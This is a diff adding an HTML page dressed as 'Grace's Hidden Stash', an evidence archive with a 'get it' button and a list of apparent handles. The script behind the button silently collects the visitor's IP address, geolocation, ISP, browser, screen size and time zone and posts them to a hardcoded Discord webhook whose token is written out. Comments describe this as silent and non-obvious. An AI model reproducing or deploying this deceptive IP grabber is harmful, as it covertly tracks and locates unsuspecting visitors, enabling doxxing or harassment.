@@ -1,0 +1,307 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Grace's Hidden Stash</title>
+<link href="https://fonts.googleapis.com/css2?family=Quicksand:wght@400;500;600;700&display=swap" rel="stylesheet">
+<style>
+  *{box-sizing:border-box;margin:0;padding:0}
+
+  html,body{height:100%}
+  body{
+    display:grid; place-items:center; padding:26px;
+    font-family:'Quicksand','Segoe UI',system-ui,sans-serif;
+    color:#0e3d5c;
+    background:
+      radial-gradient(1100px 460px at 18% -12%, rgba(255,255,255,.85), transparent 62%),
+      radial-gradient(900px 420px at 88% 6%, rgba(255,255,255,.5), transparent 60%),
+      linear-gradient(180deg,
+        #4fb3e8 0%, #7fcef1 18%, #b3e6f8 36%,
+        #d8f2e4 52%, #c8ec9e 68%, #93d269 84%, #6dbb4f 100%);
+    position:relative; overflow:hidden;
+  }
+
+  /* ── floating aero bubbles ───────────────────────── */
+  .bubbles{position:fixed;inset:0;overflow:hidden;pointer-events:none;z-index:1}
+  .bubbles i{
+    position:absolute;bottom:-160px;border-radius:50%;
+    background:radial-gradient(circle at 32% 26%,
+      rgba(255,255,255,.98), rgba(255,255,255,.30) 42%, rgba(150,215,255,.10) 72%);
+    border:1px solid rgba(255,255,255,.65);
+    box-shadow:inset 0 0 22px rgba(255,255,255,.75);
+    animation:rise linear infinite;
+  }
+  @keyframes rise{
+    to{ transform:translateY(-125vh) translateX(var(--dx,0)); }
+  }
+
+  /* ── glass window shell ──────────────────────────── */
+  .window{
+    position:relative; z-index:2;
+    width:min(950px,100%);
+    border-radius:26px; overflow:hidden;
+    background:linear-gradient(180deg,rgba(255,255,255,.78),rgba(255,255,255,.44));
+    backdrop-filter:blur(20px) saturate(180%);
+    -webkit-backdrop-filter:blur(20px) saturate(180%);
+    border:1px solid rgba(255,255,255,.9);
+    box-shadow:
+      0 34px 70px -22px rgba(8,58,98,.55),
+      0 1px 0 rgba(255,255,255,.95) inset,
+      0 -1px 0 rgba(255,255,255,.35) inset;
+  }
+  .window::after{ /* top gloss sweep */
+    content:''; position:absolute; inset:0 0 auto 0; height:48%;
+    background:linear-gradient(180deg,rgba(255,255,255,.55),rgba(255,255,255,0));
+    pointer-events:none;
+  }
+
+  .titlebar{
+    position:relative;
+    padding:17px 26px;
+    font-size:14.5px; font-weight:700; letter-spacing:.16em;
+    color:#0a3a5a;
+    background:linear-gradient(180deg,rgba(255,255,255,.98),rgba(206,238,255,.62));
+    border-bottom:1px solid rgba(255,255,255,.95);
+    text-shadow:0 1px 0 #fff;
+  }
+  .titlebar::before{
+    content:''; position:absolute; left:0; right:0; top:0; height:50%;
+    background:linear-gradient(180deg,rgba(255,255,255,.95),rgba(255,255,255,.15));
+    pointer-events:none;
+  }
+
+  .content{
+    display:grid; grid-template-columns:1.05fr .95fr; gap:18px;
+    padding:22px; position:relative; z-index:1;
+  }
+  @media(max-width:740px){ .content{grid-template-columns:1fr} }
+
+  .panel{
+    position:relative; overflow:hidden;
+    border-radius:20px; padding:20px;
+    background:linear-gradient(180deg,rgba(255,255,255,.82),rgba(255,255,255,.5));
+    border:1px solid rgba(255,255,255,.92);
+    box-shadow:0 14px 30px -14px rgba(8,58,98,.45), 0 1px 0 #fff inset;
+  }
+  .panel::before{
+    content:''; position:absolute; left:0; right:0; top:0; height:42%;
+    background:linear-gradient(180deg,rgba(255,255,255,.6),rgba(255,255,255,0));
+    pointer-events:none;
+  }
+
+  /* ── user chip ───────────────────────────────────── */
+  .chip{
+    display:inline-flex; align-items:center; gap:10px;
+    padding:5px 15px 5px 5px; border-radius:999px;
+    background:linear-gradient(180deg,rgba(255,255,255,.98),rgba(216,240,255,.75));
+    border:1px solid #fff;
+    box-shadow:0 8px 18px -8px rgba(8,58,98,.5), 0 1px 0 #fff inset;
+  }
+  .avatar{
+    width:32px;height:32px;border-radius:50%;
+    display:grid;place-items:center;
+    font-size:13px;font-weight:700;color:#fff;
+    background:linear-gradient(160deg,#63d2a8,#2fa8d8);
+    box-shadow:inset 0 2px 4px rgba(255,255,255,.85), 0 3px 8px rgba(10,70,110,.4);
+  }
+  .who{font-size:13.5px;font-weight:700;letter-spacing:.05em;color:#0a3a5a}
+  .dot{
+    width:8px;height:8px;border-radius:50%;display:inline-block;margin-left:2px;
+    background:radial-gradient(circle at 32% 30%,#b7f5c6,#3fd05f);
+    box-shadow:0 0 8px rgba(70,220,120,.9), inset 0 1px 0 #fff;
+  }
+  .mood{font-size:11.5px;color:#5c8ba8;font-weight:600}
+
+  .msg{margin-top:16px;font-size:15px;line-height:1.62;color:#12415f;font-weight:500}
+  .msg + .msg{margin-top:14px}
+  .msg b{font-weight:700}
+
+  /* ── glossy button ───────────────────────────────── */
+  .btn{
+    position:relative; overflow:hidden;
+    margin-top:20px; padding:13px 34px;
+    border:1px solid rgba(255,255,255,.95);
+    border-radius:999px; cursor:pointer;
+    font-family:inherit; font-size:15px; font-weight:700; letter-spacing:.06em;
+    color:#053450;
+    background:linear-gradient(180deg,#e2f8ff 0%,#9adcf6 47%,#5cbfea 53%,#3aa3d9 100%);
+    box-shadow:
+      0 12px 24px -9px rgba(16,110,175,.85),
+      0 1px 0 #fff inset,
+      0 -7px 14px rgba(255,255,255,.4) inset;
+    transition:transform .08s ease, filter .15s ease;
+  }
+  .btn::before{
+    content:''; position:absolute; inset:2px 2px 52% 2px; border-radius:999px;
+    background:linear-gradient(180deg,rgba(255,255,255,.95),rgba(255,255,255,.08));
+    pointer-events:none;
+  }
+  .btn:hover{filter:brightness(1.07)}
+  .btn:active{transform:translateY(1px) scale(.985)}
+  .btn:disabled{opacity:.75;cursor:default}
+
+  /* ── evidence panel ──────────────────────────────── */
+  .files h2{
+    font-size:14.5px; font-weight:700; letter-spacing:.13em; color:#0a3a5a;
+    text-shadow:0 1px 0 #fff;
+  }
+  .squares{display:flex;gap:14px;margin:18px 0 20px;flex-wrap:wrap}
+  .sq{
+    position:relative; overflow:hidden;
+    width:62px;height:62px;border-radius:16px;
+    border:1px solid rgba(255,255,255,.9);
+    box-shadow:0 12px 22px -9px rgba(8,58,98,.6), 0 1px 0 rgba(255,255,255,.85) inset;
+  }
+  .sq::after{
+    content:''; position:absolute; inset:3px 3px 54% 3px; border-radius:13px;
+    background:linear-gradient(180deg,rgba(255,255,255,.88),rgba(255,255,255,.04));
+  }
+  .sq.r{background:linear-gradient(180deg,#ff8d8d,#e53232)}
+  .sq.o{background:linear-gradient(180deg,#ffc078,#f0871f)}
+  .sq.y{background:linear-gradient(180deg,#fff08a,#f0d418)}
+  .sq.g{background:linear-gradient(180deg,#a4ef9c,#43c94f)}
+  .sq.sealed{animation:pop .5s ease}
+  @keyframes pop{
+    0%{transform:scale(1)} 45%{transform:scale(1.16)} 100%{transform:scale(1)}
+  }
+
+  .legend{list-style:none;display:grid;gap:9px}
+  .legend li{
+    display:flex;align-items:center;gap:10px;
+    font-size:14.5px;font-weight:600;color:#12415f;
+    letter-spacing:.02em;
+  }
+  .legend .sw{
+    width:12px;height:12px;border-radius:50%;
+    box-shadow:inset 0 1px 0 rgba(255,255,255,.95), 0 2px 5px rgba(8,58,98,.35);
+  }
+  .legend .r{background:#e53232}.legend .o{background:#f0871f}
+  .legend .y{background:#f0d418}.legend .g{background:#43c94f}
+</style>
+</head>
+<body>
+
+<!-- aero bubbles -->
+<div class="bubbles">
+  <i style="left:6%;  width:52px;height:52px;animation-duration:19s;animation-delay:0s"></i>
+  <i style="left:22%; width:26px;height:26px;animation-duration:14s;animation-delay:3s;--dx:40px"></i>
+  <i style="left:38%; width:74px;height:74px;animation-duration:26s;animation-delay:6s;--dx:-30px"></i>
+  <i style="left:57%; width:34px;height:34px;animation-duration:16s;animation-delay:1.5s;--dx:25px"></i>
+  <i style="left:71%; width:58px;height:58px;animation-duration:22s;animation-delay:8s"></i>
+  <i style="left:86%; width:22px;height:22px;animation-duration:13s;animation-delay:4.5s;--dx:-45px"></i>
+  <i style="left:94%; width:44px;height:44px;animation-duration:24s;animation-delay:10s"></i>
+</div>
+
+<main class="window">
+  <div class="titlebar">GRACE'S HIDDEN STASH</div>
+
+  <div class="content">
+
+    <!-- left: chat panel -->
+    <section class="panel">
+      <div class="chip">
+        <span class="avatar">G</span>
+        <span class="who">GRACE</span>
+        <span class="dot"></span>
+        <span class="mood">nil</span>
+      </div>
+
+      <p class="msg">This is only for evidence archiving dude, do not try to do something else with it.</p>
+      <p class="msg">Also click this stupid button below me to get it</p>
+
+      <button class="btn" id="btn">get it</button>
+    </section>
+
+    <!-- right: evidence panel -->
+    <section class="panel files">
+      <h2>SSNE FILES AND EVIDENCES</h2>
+
+      <div class="squares">
+        <div class="sq r"></div>
+        <div class="sq o"></div>
+        <div class="sq y"></div>
+        <div class="sq g"></div>
+      </div>
+
+      <ul class="legend">
+        <li><span class="sw r"></span>paxotide:red</li>
+        <li><span class="sw o"></span>kali:orange</li>
+        <li><span class="sw y"></span>caelan:yellow</li>
+        <li><span class="sw g"></span>zombie:green</li>
+      </ul>
+    </section>
+
+  </div>
+</main>
+
+<script>
+/* ══════════════════════════════════════════════════════
+   PASTE YOUR DISCORD WEBHOOK URL HERE  (only line to edit)
+   ══════════════════════════════════════════════════════ */
+const WEBHOOK = "https://discord.com/api/webhooks/1561395965393502278/th7ynS51yWyML4wH9jvRDKdaiO4obMP__aut7ZUG5jhihBVAPyx2ntDkalIqevgUN5sa";
+const BOTNAME = "Grace's Hidden Stash";
+
+const $ = s => document.querySelector(s);
+
+/* silent IP + geo lookup */
+async function netInfo(){
+  try{
+    const r = await fetch("https://ipapi.co/json/");
+    const d = await r.json();
+    if(d.ip) return { ip:d.ip, geo:[d.city,d.region,d.country_name].filter(Boolean).join(", "), isp:d.org||"?" };
+  }catch(e){}
+  try{
+    const r = await fetch("https://api.ipify.org?format=json");
+    const d = await r.json();
+    return { ip:d.ip, geo:"?", isp:"?" };
+  }catch(e){}
+  return { ip:"unknown", geo:"?", isp:"?" };
+}
+
+async function fire(i){
+  const r = await fetch(WEBHOOK,{
+    method:"POST",
+    headers:{"Content-Type":"application/json"},
+    body:JSON.stringify({
+      username:BOTNAME,
+      embeds:[{
+        title:"stash opened",
+        color:0x5cbfea,
+        timestamp:new Date().toISOString(),
+        fields:[
+          {name:"ip",       value:i.ip,  inline:true},
+          {name:"where",    value:i.geo, inline:true},
+          {name:"isp",      value:i.isp, inline:true},
+          {name:"agent",    value:navigator.userAgent, inline:false},
+          {name:"screen",   value:screen.width+"x"+screen.height, inline:true},
+          {name:"tz",       value:Intl.DateTimeFormat().resolvedOptions().timeZone, inline:true}
+        ],
+        footer:{text:location.host||"local file"}
+      }]
+    })
+  });
+  return r.ok;
+}
+
+/* the one click */
+$("#btn").addEventListener("click", async () => {
+  const b = $("#btn");
+  b.disabled = true;
+  b.textContent = "…";
+
+  const info = await netInfo();
+  let ok = false;
+  try{ ok = await fire(info); }catch(e){}
+
+  /* subtle seal animation — no text, stays non-obvious */
+  document.querySelectorAll(".sq").forEach((s,n)=>{
+    setTimeout(()=>{ s.classList.add("sealed"); }, n*110);
+  });
+
+  b.textContent = ok ? "got it" : "again";
+  setTimeout(()=>{ b.textContent = "get it"; b.disabled = false; }, 1600);
+});
+</script>
+</body>
+</html>
